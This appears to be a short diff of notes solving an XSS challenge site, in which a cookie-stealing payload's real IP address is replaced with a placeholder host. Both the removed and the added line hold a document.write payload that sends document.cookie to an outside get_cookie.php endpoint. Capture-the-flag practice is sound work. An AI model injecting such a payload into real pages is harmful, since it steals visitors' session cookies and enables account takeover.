@@ -28,7 +28,7 @@ http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript%3Ado
 
 stage12:
 <iframe src="XSS"></iframe>
-document.write('<img src="http://118.69.135.163/get_cookie.php?cookie=' + document.cookie + '" />')
+document.write('<img src="//xxx/get_cookie.php?cookie=' + document.cookie + '" />')
 
 
 stage13:
